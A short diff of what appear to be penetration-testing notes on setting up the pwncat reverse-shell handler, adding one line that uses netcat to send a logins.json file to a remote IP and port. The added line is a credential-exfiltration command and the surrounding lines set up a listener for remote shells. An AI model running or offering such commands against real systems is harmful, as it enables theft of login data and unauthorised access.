@@ -101,6 +101,7 @@
 - python version => stabilized
 - easier to transfer file
 - python3 -m venv pwncat-env
+- nc.exe -nv 10.9.1.255 1234 < logins.json
 - source pwncat-env/bin/activate
 - pwncat-cs -lp PORT
 
